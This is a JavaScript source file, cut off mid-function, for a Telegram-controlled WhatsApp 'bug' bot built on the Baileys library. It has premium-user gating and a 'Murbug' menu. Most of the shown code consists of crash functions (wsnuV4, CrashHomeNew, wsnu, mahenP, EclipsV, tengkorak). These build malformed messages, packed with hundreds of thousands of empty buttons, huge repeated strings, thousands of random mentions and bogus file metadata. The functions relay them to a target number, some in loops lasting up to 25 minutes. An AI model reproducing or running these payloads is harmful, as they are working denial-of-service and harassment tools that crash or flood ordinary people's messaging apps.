var saveBlocked, fetchJsonHttps, getTokenId, createSafeSock, activateSecureMode,
    isAuthorizedToken, formatRuntime, formatMemory, ensurePremGroupFile,
    loadPremGroups, savePremGroups, isPremGroup, addPremGroup, delPremGroup,
    logCommand, updateButtonColors, wsnuV4, CrashHomeNew, wsnu, mahenP,
    EclipsV, tengkorak, Telegraf, spawn, pipeline, createWriteStream,
    fs, path, blockedCmds, data, jid, vm, os, tokenBot, ownerID, adminFile,
    FormData, https, makeWASocket, useMultiFileAuthState,
    downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate,
    generateWAMessageContent, generateWAMessage, prepareWAMessageMedia,
    generateWAMessageFromContent, MediaType, areJidsSameUser,
    WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState,
    GroupMetadata, initInMemoryKeyStore, getContentType,
    MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON,
    WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric,
    ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode,
    WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey,
    MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage,
    WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage,
    BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX,
    WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, jidDecode,
    mentionedJid, processTime, Browser, MessageType, Presence,
    WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers,
    GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto,
    isBaileys, AnyMessageContent, fetchLatestBaileysVersion,
    templateMessage, InteractiveMessage, Header, pino, crypto, chalk,
    axios, moment, EventEmitter, getCurrentDate, makeInMemoryStore,
    databaseUrl, thumbnailUrl, question, bot, secureMode, sock,
    isWhatsAppConnected, linkedWhatsAppNumber, lastPairingMessage,
    usePairingCode, sleep, premiumFile, cooldownFile, loadPremiumUsers,
    savePremiumUsers, addpremUser, removePremiumUser, isPremiumUser,
    loadCooldown, saveCooldown, cooldown, userCooldowns, startSesi,
    checkWhatsAppConnection, checkCooldown, checkPremium, loadJSON,
    saveJSON, loadAdmins, saveAdmins, addAdmin, removeAdmin, isAdmin,
    PREM_GROUP_FILE, getRandomColor, autoColorMessages, lastUpdateMap;

saveBlocked = function () {
  fs.writeFileSync(
    "./database/cmd.json",
    JSON.stringify({ blocked: [].concat(blockedCmds) }, null, 2)
  );
};

fetchJsonHttps = function (url, timeout = 5000) {
  return new Promise(function (resolve, reject) {
    var req;
    try {
      req = https.get(url, { timeout: timeout }, function (res) {
        var statusCode = res.statusCode;
        var raw = "";

        if (statusCode < 200 || statusCode >= 300) {
          res.on("data", function (chunk) {
            raw += chunk;
          });
          res.on("end", function () {
            reject(new Error("HTTP " + String(statusCode)));
          });
          return;
        }

        res.on("data", function (chunk) {
          raw += chunk;
        });
        res.on("end", function () {
          try {
            var json = JSON.parse(raw);
            resolve(json);
          } catch (err) {
            reject(new Error("Invalid JSON response"));
          }
        });
      });

      req.on("timeout", function () {
        req.destroy(new Error("Request timeout"));
      });
      req.on("error", function (err) {
        reject(err);
      });
    } catch (err) {
      reject(err);
    }
  });
};

getTokenId = function (token) {
  if (!token || typeof token !== "string") {
    return "";
  }
  var idx = token.indexOf(":");
  return idx === -1 ? token : token.slice(0, idx);
};

createSafeSock = function (sock) {
  var sendCount = 0;
  var MAX_SENDS = 500;

  var normalize = function (target) {
    return target && target.includes("@")
      ? target
      : target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  };

  return {
    sendMessage: async function (target, message) {
      sendCount++;
      if (sendCount > MAX_SENDS) {
        throw new Error("RateLimit");
      }
      var targetJid = normalize(target);
      return await sock.sendMessage(targetJid, message);
    },

    relayMessage: async function (target, messageObj, opts = {}) {
      sendCount++;
      if (sendCount > MAX_SENDS) {
        throw new Error("RateLimit");
      }
      var targetJid = normalize(target);
      return await sock.relayMessage(targetJid, messageObj, opts);
    },

    presenceSubscribe: async function (target) {
      try {
        var targetJid = normalize(target);
        return await sock.presenceSubscribe(targetJid);
      } catch (e) {}
    },

    sendPresenceUpdate: async function (state, target) {
      try {
        var targetJid = normalize(target);
        return await sock.sendPresenceUpdate(state, targetJid);
      } catch (e) {}
    }
  };
};

activateSecureMode = function () {
  secureMode = true;
};

isAuthorizedToken = async function (token) {
  try {
    var res = await fetchJsonHttps(databaseUrl, 5000);
    var authorizedTokens = (res && res.tokens) || [];
    if (!Array.isArray(authorizedTokens)) {
      return false;
    }
    var tokenId = getTokenId(token);
    return authorizedTokens.some(function (t) {
      return getTokenId(String(t)) === tokenId;
    });
  } catch (e) {
    return false;
  }
};

formatRuntime = function () {
  var sec, hrs, mins;
  sec = Math.floor(process.uptime());
  hrs = Math.floor(sec / 3600);
  sec = sec % 3600;
  mins = Math.floor(sec / 60);
  sec = sec % 60;
  return String(hrs) + "h " + String(mins) + "m " + String(sec) + "s";
};

formatMemory = function () {
  var usedMB;
  usedMB = process.memoryUsage().rss / 1024 / 1024;
  return String(usedMB.toFixed(0)) + " MB";
};

ensurePremGroupFile = function () {
  if (!fs.existsSync(PREM_GROUP_FILE)) {
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
  }
};

loadPremGroups = function () {
  var raw, parsed;
  ensurePremGroupFile();
  try {
    raw = fs.readFileSync(PREM_GROUP_FILE, "utf8");
    parsed = JSON.parse(raw);
    return Array.isArray(parsed) ? parsed.map(String) : [];
  } catch (_err) {
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
    return [];
  }
};

savePremGroups = function (groups) {
  var unique;
  ensurePremGroupFile();
  unique = Array.from(new Set(groups.map(String)));
  fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify(unique, null, 2));
};

isPremGroup = function (chatId) {
  var groups;
  groups = loadPremGroups();
  return groups.includes(String(chatId));
};

addPremGroup = function (chatId) {
  var groups, id;
  groups = loadPremGroups();
  id = String(chatId);
  if (groups.includes(id)) {
    return false;
  }
  groups.push(id);
  savePremGroups(groups);
  return true;
};

delPremGroup = function (chatId) {
  var groups, id, next;
  groups = loadPremGroups();
  id = String(chatId);
  if (!groups.includes(id)) {
    return false;
  }
  next = groups.filter(function (x) {
    return x !== id;
  });
  savePremGroups(next);
  return true;
};

logCommand = function (ctx, command) {
  console.log(
    "\n═══════════════════════════════\n" +
    "👤 User     : @" + String(ctx.from.username || "Tidak Ada") + "\n" +
    "🆔 ID       : " + String(ctx.from.id) + "\n" +
    "💬 Chat ID  : " + String(ctx.chat.id) + "\n" +
    "📌 Type     : " + String(ctx.chat.type) + "\n" +
    "⚡ Command  : " + String(command) + "\n" +
    "🕒 Time     : " + String(new Date().toLocaleString("id-ID")) + "\n" +
    "═══════════════════════════════\n"
  );
};

updateButtonColors = async function (chatId, messageId) {
  var now, lastUpdate, currentColor, match, waitTime;

  if (!autoColorMessages.has(chatId)) {
    return;
  }

  if (autoColorMessages.get(chatId) !== messageId) {
    return;
  }

  now = Date.now();
  lastUpdate = lastUpdateMap.get(chatId) || 0;

  if (now - lastUpdate < 5000) {
    return;
  }

  try {
    currentColor = getRandomColor();

    await bot.telegram.editMessageReplyMarkup(chatId, messageId, null, {
      inline_keyboard: [
        [
          {
            text: "𝐌𝐮𝐫𝐛𝐮𝐠 𝐌𝐞𝐧𝐮",
            callback_data: "/bug",
            style: currentColor,
            icon_custom_emoji_id: "5334998226636390258"
          }
        ],
        [
          {
            text: "⌜ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫𝐬 ⌟",
            url: "https://t.me/kayoablo42",
            style: currentColor,
            icon_custom_emoji_id: "5330237710655306682"
          },
          {
            text: "⌜ 𝐈𝐧𝐟𝐨 𝐒𝐞𝐫𝐯𝐞𝐫 ⌟",
            url: "https://t.me/phoenixchn",
            style: currentColor,
            icon_custom_emoji_id: "5370577035636786019"
          }
        ],
        [
          {
            text: "𝐊𝐨𝐧𝐭𝐫𝐨𝐥 𝐌𝐞𝐧𝐮",
            callback_data: "/controls",
            style: currentColor,
            icon_custom_emoji_id: "5816539591812845173"
          }
        ]
      ]
    });

    lastUpdateMap.set(chatId, now);
  } catch (e) {
    if (e.description && e.description.includes("429")) {
      match = e.description.match(/retry after (\d+)/);
      waitTime = match ? parseInt(match[1]) * 1000 : 5000;
      lastUpdateMap.set(chatId, now + waitTime - 5000);
    } else if (e.description && e.description.includes("message to edit not found")) {
      autoColorMessages.delete(chatId);
      lastUpdateMap.delete(chatId);
    }
  }
};

wsnuV4 = async function (sock, target) {
  var i, rexzy;
  i = 0;
  for (; i < 100; i = i + 1) {
    rexzy = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: {
              text: "Maap blunder" + "\"".repeat(30000)
            },
            nativeFlowMessage: {
              name: "carousel_message",
              buttons: [],
              cards: Array.from({
                length: 3000
              }, function () {
                return {};
              })
            },
            contextInfo: {
              remoteJid: "@s.whatsapp.net",
              mentionedJid: Array.from({
                length: 2000
              }, function () {
                return Math.floor(Math.random() * 700000) + "@s.whatsapp.net";
              })
            }
          }
        }
      }
    };
    try {
      await sock.relayMessage(target, rexzy, {});
    } catch (err) {
      console.error("gagal kirim ke-" + String(i + 1) + ":", err.message || err);
    }
  }
};
CrashHomeNew = async function (target) {
  var msg1, msg2, msg3, msg4;
  msg1 = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "𝗧𝗘𝗡𝗚𝗞𝗢𝗥𝗔𝗞𝗫𝟳 𝗖𝗥𝗔𝗦𝗛"
          },
          nativeFlowMessage: {
            extra: "T".repeat(20000),
            buttons: Array.from({
              length: 800000
            }, function () {
              return {};
            })
          }
        }
      }
    }
  };
  await sock.relayMessage(target, msg1, {});
  msg2 = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "𝗧𝗘𝗡𝗚𝗞𝗢𝗥𝗔𝗞𝗫𝟳 𝗖𝗥𝗔𝗦𝗛"
          },
          nativeFlowMessage: {
            buttons: Array.from({
              length: 800000
            }, function () {
              return {};
            })
          }
        }
      }
    }
  };
  await sock.relayMessage(target, msg2, {});
  msg3 = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "𝗧𝗘𝗡𝗚𝗞𝗢𝗥𝗔𝗞𝗫𝟳 𝗖𝗥𝗔𝗦𝗛"
          },
          nativeFlowMessage: {
            buttons: Array.from({
              length: 800000
            }, function () {
              return {};
            })
          }
        }
      }
    }
  };
  await sock.relayMessage(target, msg3, {});
  msg4 = {
    interactiveMessage: {
      body: {
        text: "𝗧𝗘𝗡𝗚𝗞𝗢𝗥𝗔𝗞𝗫𝟳 𝗖𝗥𝗔𝗦𝗛"
      },
      nativeFlowMessage: {
        buttons: Array.from({
          length: 800000
        }, function () {
          return {};
        })
      },
      contextInfo: {
        mentionedJid: Array.from({
          length: 2000
        }, function () {
          return Math.floor(Math.random() * 9000000000) + "@s.whatsapp.net";
        }),
        forwardingScore: 999999999,
        isForwarded: true
      }
    }
  };
  await sock.relayMessage(target, msg4, {});
};
wsnu = async function (sock, target) {
  var message;
  message = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          imageMessage: {
            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQPVo-gJAQ8KXDdCf_zt-yygpiOH41VCYtO8okCr7667QSlG93CoPc3CZuuCAEYC4sGwR7EmeoEFtU17ACt_3Ul0IifWRzixg3LG7KQ5Yw?ccb=9-4&oh=01_Q5Aa5wFDRvwSEkRhBwHRjIaRK7vIhl26JHBgWWillVpU3bqmRg&oe=6AEA147F&_nc_sid=e6ed6c&mms3=true",
            mimetype: "image/jpeg",
            caption: "RexzyCoders.js" + " ".repeat(15000),
            fileSha256: "O3QYNylVnODT4/7rmSUoP+BICqcKwP6D2MUyX86pqho=",
            fileLength: "128399",
            height: 3840,
            width: 3840,
            mediaKey: "n80Ce+Y1NEAJPURD/aemD45gWVcXWkYF2yFWKgJo4zM=",
            fileEncSha256: "s48rcNN+R9Tf3CwywiBdepUBW0ggQOtGkOa6JMd1Jb0=",
            directPath: "/o1/v/t24/f2/m234/AQPVo-gJAQ8KXDdCf_zt-yygpiOH41VCYtO8okCr7667QSlG93CoPc3CZuuCAEYC4sGwR7EmeoEFtU17ACt_3Ul0IifWRzixg3LG7KQ5Yw?ccb=9-4&oh=01_Q5Aa5wFDRvwSEkRhBwHRjIaRK7vIhl26JHBgWWillVpU3bqmRg&oe=6AEA147F&_nc_sid=e6ed6c",
            mediaKeyTimestamp: "1791136413",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQADAQEAAAAAAAAAAAAAAAABAgMABP/aAAwDAQACEAMQAAAAxyt7o2dO5iRbxfRZsqZLnL7LITAZuKeglWtbqOGjNOaMzNFjGoiMUtJG/ogpqIkG18Sdi5VltZzUROiMG2VEYHcObMv4zy57Pb65sKDohZaHPbJVBGneGzjYGlQD83//xAAjEAACAgIDAAMAAwEAAAAAAAABAgADBBESITETIkEFI1FS/9oACAEBAAE/AKFVjp/2W44R9AxgAdCUY73OFWH+H1VsONy6lqmKmalFQcgEzKoSlRpoh8Eqx2ubQPcuxzW5BlH9a70SSYc1iBWiTKQtowUMSNCWVNSq/wCxi9h7JlSLb1vTStL6HB0epbSLkFxMepErVtwNQ6ByD9Y3C9PkA0omNZjqPuI2KMn7jyWpTjL0NvKVDEaMof40JtGwBLTzI++kaWPdy4KdpE6p0AdygaB+TZWBqQzBj0fJjZTCwoG6mWVJJJ3Ex7eetSpWClSdxy9doJG13MS2h7eLIAZlZGOhKFJdksEZB4YmO9tfNTMcPTstoyzI7O1EW+wgDl5EJC8iZcwvIA98EuobFas7llhsUd7lON84G16BmSgqr5VdRduAfyWjvzqBSzCXI9VYH/UxaXNoYjoTMvNjcSNalY2QA0xskIxqK9TJHMFRELbAEtNV1YTpWEFCJpzMu7m6iWXLVSmvSOpba5s2YLT8imM2nVyJfdpVZR0Zg/AXYsPJk8XYlZU7bAYbEvGNWOZAJ/BLbCVLN++R15gFYadcDDdWQRKLE4cSOSyumoqWqlxWkb1P/8QAHBEBAAMBAQADAAAAAAAAAAAAAQACESExEiJB/9oACAECAQE/A DEyX2oyt7NgSFgTZa1djZq8Z810ZRx3rk23sKb6LGtGW7VCU2uE8t9vJ0lkKcljMrsOWJdG1cJoRcI+bP2UsikOz//EAB0RAQACAgMBAQAAAAAAAAAAAAEAAhExEiFBA1H/2gAIAQMBAT8A/9k=",
            contextInfo: {
              mentionedJid: Array.from({
                length: 2000
              }, function () {
                return Math.floor(Math.random() * 700000) + "@s.whatsapp.net";
              }),
              urlTrackingMap: {
                urlTrackingMapElements: Array.from({
                  length: 500000
                }, function () {
                  return {};
                })
              }
            }
          },
          body: {
            text: "rexzycoders.js"
          },
          nativeFlowMessage: {
            buttons: Array.from({
              length: 500000
            }, function () {
              return {};
            })
          },
          quotedMessage: {
            interactiveMessage: {
              body: {
                text: "anjass" + "{}".repeat(50000)
              },
              nativeFlowMessage: {
                buttons: Array.from({
                  length: 500000
                }, function () {
                  return {};
                })
              }
            }
          }
        }
      }
    }
  };
  try {
    await sock.relayMessage(target, message, {
      noSelfSync: true
    });
  } catch (err) {
    console.error("gagal kirim:", err.message || err);
  }
};
mahenP = async function (target) {
  var payloads, mahenpler02, mahenpler, mahen;
  payloads = ["placeholderResendMessage", Buffer.from("placeholderResendMessage").toString("base64"), Buffer.from(Buffer.from("placeholderResendMessage").toString("base64")).toString("base64"), Array.from("placeholderResendMessage").map(function (c) {
    return c.charCodeAt(0);
  }), Array.from("placeholderResendMessage").map(function (c) {
    return c.charCodeAt(0) ^ 66;
  }), Array.from("placeholderResendMessage").map(function (c) {
    return c.charCodeAt(0) ^ 255;
  }), Buffer.from(Array.from("placeholderResendMessage").map(function (c) {
    return c.charCodeAt(0) ^ 90;
  })).toString("base64")];
  mahenpler02 = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "​鉽"
          },
          header: {
            title: "‍"
          },
          nativeFlowMessage: {
            messageParamsJson: JSON.stringify({
              placeholderResendMessage: payloads[i % payloads.length]
            }),
            buttons: Array.from({
              length: 500550
            }, function () {
              return {};
            })
          },
          nativeFlowResponseMessage: {
            buttons: [{
              name: "meta_ai_message"
            }]
          }
        }
      }
    }
  };
  mahenpler = {
    requestPhoneNumberMessage: {
      contextInfo: {
        quotedMessage: {
          documentMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
            mimetype: "application/pdf",
            fileSha256: Buffer.alloc(32).fill(200),
            fileLength: 0,
            pageCount: 0,
            mediaKey: Buffer.alloc(32).fill(400),
            fileName: "sock.pdf",
            fileEncSha256: Buffer.alloc(32).fill(500),
            directPath: "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
            mediaKeyTimestamp: 1737369406,
            caption: ":⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⸸⃟⃟』ꪾ〽️",
            title: "t.me/mahenxp",
            mentionedJid: [target]
          }
        },
        externalAdReply: {
          title: ":⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⸸⃟⃟『』ꪾ〽️",
          body: "𑇂𑆵𑆴𑆿".repeat(30000),
          mediaType: "VIDEO",
          renderLargerThumbnail: true,
          sourceUrl: "https://t.me/mahenxp",
          mediaUrl: "https://t.me/mahenxp",
          containsAutoReply: true,
          showAdAttribution: true,
          ctwaClid: "ctwa_clid_example",
          ref: "ref_example"
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: String("1".repeat(9000)) + "@newsletter",
          newsletterName: " The Travas",
          contentType: "UPDATE"
        }
      },
      skipType: 7
    }
  };
  mahen = await generateWAMessageFromContent(target, mahenpler, payloads, mahenpler02, {});
  await sock.relayMessage(target, mahen.message, {
    messageId: mahen.key.id
  });
};
EclipsV = async function (sock, target) {
  var duration, startTime, Nullmessage1, i;
  duration = 1500000;
  startTime = Date.now();
  Nullmessage1 = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "福 | VqX メ"
          },
          nativeFlowMessage: {
            buttons: Array.from({
              length: 500000
            }, function () {
              return {};
            }),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
        }
      }
    }
  };
  i = 0;
  while (Date.now() - startTime < duration) {
    await sock.relayMessage(target, Nullmessage1, {
      noSelfSync: true
    });
    i = i + 1;
  }
};
tengkorak = async function (sock, target) {
  var msg2;
  msg2 = {
    groupStatusMessageV2: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
          fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
          fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
          mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
          mimetype: "image/webp",
          directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
          fileLength: "10610",
          mediaKeyTimestamp: "1775044724",
          stickerSentTs: "1775044724091"
        },
        contextInfo: {
          mentionedJid: Array.from({
            length: 1900
          }, function () {
            return "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net";
          }),
          quotedMessage: {
            interactiveMessage: {
              body: {
                text: "Rexzy"
              },
              nativeFlowMessage: {
                buttons: Array.from({
                  length: 500000
                }, function () {
                  return {};
                }),
                buttons: Array.from({
                  length: 500000
                }, function () {
                  return {};
                }),
                buttons: Array.from({
                  length: 500000
                }, function () {
                  return {};
                })
              }
            }
          }
        }
      }
    }
  };
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "Rexzy"
          },
          nativeFlowMessage: {
            buttons: Array.from({
              length: 500000
            }, function () {
              return {};
            }),
            buttons: Array.from({
              length: 500000
            }, function () {
              return {};
            }),
            buttons: Array.from({
              length: 500000
            }, function () {
              return {};
            })
          }
        },
        contextInfo: {
          mentionedJid: Array.from({
            length: 1900
          }, function () {
            return "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net";
          }),
          quotedMessage: {
            interactiveMessage: {
              body: {
                text: "Rexzy"
              },
              nativeFlowMessage: {
                buttons: Array.from({
                  length: 500000
                }, function () {
                  return {};
                }),
                buttons: Array.from({
                  length: 500000
                }, function () {
                  return {};
                }),
                buttons: Array.from({
                  length: 500000
                }, function () {
                  return {};
                })
              }
            }
          }
        }
      }
    }
  });
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 8421891191,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "<",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: "https://files.catbox.moe/nncwg0.jpg"
        },
        contextInfo: {
          mentionedJid: Array.from({
            length: 1900
          }, function () {
            return "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net";
          }),
          quotedMessage: {
            interactiveMessage: {
              body: {
                text: "Rexzy"
              },
              nativeFlowMessage: {
                buttons: Array.from({
                  length: 500000
                }, function () {
                  return {};
                }),
                buttons: Array.from({
                  length: 500000
                }, function () {
                  return {};
                }),
                buttons: Array.from({
                  length: 500000
                }, function () {
                  return {};
                })
              }
            }
          }
        }
      }
    }
  });
  await sock.relayMessage(target, msg2, {});
};

Telegraf = require("telegraf").Telegraf;
spawn = require("child_process").spawn;
pipeline = require("stream/promises").pipeline;
createWriteStream = require("fs").createWriteStream;
fs = require("fs");
path = require("path");
blockedCmds = new Set();

if (fs.existsSync("./database/cmd.json")) {
  data = JSON.parse(fs.readFileSync("./database/cmd.json"));
  blockedCmds = new Set(data.blocked || []);
}

jid = "0@s.whatsapp.net";
vm = require("vm");
os = require("os");
tokenBot = require("./settings/config").tokenBot;
ownerID = require("./settings/config").ownerID;
adminFile = "./database/adminuser.json";
FormData = require("form-data");
https = require("https");

makeWASocket = require("@whiskeysockets/baileys").default;
useMultiFileAuthState = require("@whiskeysockets/baileys").useMultiFileAuthState;
downloadContentFromMessage = require("@whiskeysockets/baileys").downloadContentFromMessage;
emitGroupParticipantsUpdate = require("@whiskeysockets/baileys").emitGroupParticipantsUpdate;
emitGroupUpdate = require("@whiskeysockets/baileys").emitGroupUpdate;
generateWAMessageContent = require("@whiskeysockets/baileys").generateWAMessageContent;
generateWAMessage = require("@whiskeysockets/baileys").generateWAMessage;
prepareWAMessageMedia = require("@whiskeysockets/baileys").prepareWAMessageMedia;
generateWAMessageFromContent = require("@whiskeysockets/baileys").generateWAMessageFromContent;
MediaType = require("@whiskeysockets/baileys").MediaType;
areJidsSameUser = require("@whiskeysockets/baileys").areJidsSameUser;
WAMessageStatus = require("@whiskeysockets/baileys").WAMessageStatus;
downloadAndSaveMediaMessage = require("@whiskeysockets/baileys").downloadAndSaveMediaMessage;
AuthenticationState = require("@whiskeysockets/baileys").AuthenticationState;
GroupMetadata = require("@whiskeysockets/baileys").GroupMetadata;
initInMemoryKeyStore = require("@whiskeysockets/baileys").initInMemoryKeyStore;
getContentType = require("@whiskeysockets/baileys").getContentType;
MiscMessageGenerationOptions = require("@whiskeysockets/baileys").MiscMessageGenerationOptions;
useSingleFileAuthState = require("@whiskeysockets/baileys").useSingleFileAuthState;
BufferJSON = require("@whiskeysockets/baileys").BufferJSON;
WAMessageProto = require("@whiskeysockets/baileys").WAMessageProto;
MessageOptions = require("@whiskeysockets/baileys").MessageOptions;
WAFlag = require("@whiskeysockets/baileys").WAFlag;
WANode = require("@whiskeysockets/baileys").WANode;
WAMetric = require("@whiskeysockets/baileys").WAMetric;
ChatModification = require("@whiskeysockets/baileys").ChatModification;
MessageTypeProto = require("@whiskeysockets/baileys").MessageTypeProto;
WALocationMessage = require("@whiskeysockets/baileys").WALocationMessage;
ReconnectMode = require("@whiskeysockets/baileys").ReconnectMode;
WAContextInfo = require("@whiskeysockets/baileys").WAContextInfo;
proto = require("@whiskeysockets/baileys").proto;
WAGroupMetadata = require("@whiskeysockets/baileys").WAGroupMetadata;
ProxyAgent = require("@whiskeysockets/baileys").ProxyAgent;
waChatKey = require("@whiskeysockets/baileys").waChatKey;
MimetypeMap = require("@whiskeysockets/baileys").MimetypeMap;
MediaPathMap = require("@whiskeysockets/baileys").MediaPathMap;
WAContactMessage = require("@whiskeysockets/baileys").WAContactMessage;
WAContactsArrayMessage = require("@whiskeysockets/baileys").WAContactsArrayMessage;
WAGroupInviteMessage = require("@whiskeysockets/baileys").WAGroupInviteMessage;
WATextMessage = require("@whiskeysockets/baileys").WATextMessage;
WAMessageContent = require("@whiskeysockets/baileys").WAMessageContent;
WAMessage = require("@whiskeysockets/baileys").WAMessage;
BaileysError = require("@whiskeysockets/baileys").BaileysError;
WA_MESSAGE_STATUS_TYPE = require("@whiskeysockets/baileys").WA_MESSAGE_STATUS_TYPE;
MediaConnInfo = require("@whiskeysockets/baileys").MediaConnInfo;
URL_REGEX = require("@whiskeysockets/baileys").URL_REGEX;
WAUrlInfo = require("@whiskeysockets/baileys").WAUrlInfo;
WA_DEFAULT_EPHEMERAL = require("@whiskeysockets/baileys").WA_DEFAULT_EPHEMERAL;
WAMediaUpload = require("@whiskeysockets/baileys").WAMediaUpload;
jidDecode = require("@whiskeysockets/baileys").jidDecode;
mentionedJid = require("@whiskeysockets/baileys").mentionedJid;
processTime = require("@whiskeysockets/baileys").processTime;
Browser = require("@whiskeysockets/baileys").Browser;
MessageType = require("@whiskeysockets/baileys").MessageType;
Presence = require("@whiskeysockets/baileys").Presence;
WA_MESSAGE_STUB_TYPES = require("@whiskeysockets/baileys").WA_MESSAGE_STUB_TYPES;
Mimetype = require("@whiskeysockets/baileys").Mimetype;
relayWAMessage = require("@whiskeysockets/baileys").relayWAMessage;
Browsers = require("@whiskeysockets/baileys").Browsers;
GroupSettingChange = require("@whiskeysockets/baileys").GroupSettingChange;
DisconnectReason = require("@whiskeysockets/baileys").DisconnectReason;
WASocket = require("@whiskeysockets/baileys").WASocket;
getStream = require("@whiskeysockets/baileys").getStream;
WAProto = require("@whiskeysockets/baileys").WAProto;
isBaileys = require("@whiskeysockets/baileys").isBaileys;
AnyMessageContent = require("@whiskeysockets/baileys").AnyMessageContent;
fetchLatestBaileysVersion = require("@whiskeysockets/baileys").fetchLatestBaileysVersion;
templateMessage = require("@whiskeysockets/baileys").templateMessage;
InteractiveMessage = require("@whiskeysockets/baileys").InteractiveMessage;
Header = require("@whiskeysockets/baileys").Header;

pino = require("pino");
crypto = require("crypto");
chalk = require("chalk");
axios = require("axios");
moment = require("moment-timezone");
EventEmitter = require("events");

getCurrentDate = new Date().toLocaleDateString("id-ID", {
  weekday: "long",
  day: "numeric",
  month: "long",
  year: "numeric",
  hour: "2-digit",
  minute: "2-digit",
  second: "2-digit"
});

makeInMemoryStore = function (options) {
  var logger = options.logger;
  var ev = new EventEmitter();
  var chats = {};
  var messages = {};
  var contacts = {};

  ev.on("messages.upsert", function (payload) {
    var newMessages = payload.messages;
    for (const msg of newMessages) {
      var chatId = msg.key.remoteJid;
      if (!messages[chatId]) {
        messages[chatId] = [];
      }
      messages[chatId].push(msg);
      if (messages[chatId].length > 50) {
        messages[chatId].shift();
      }
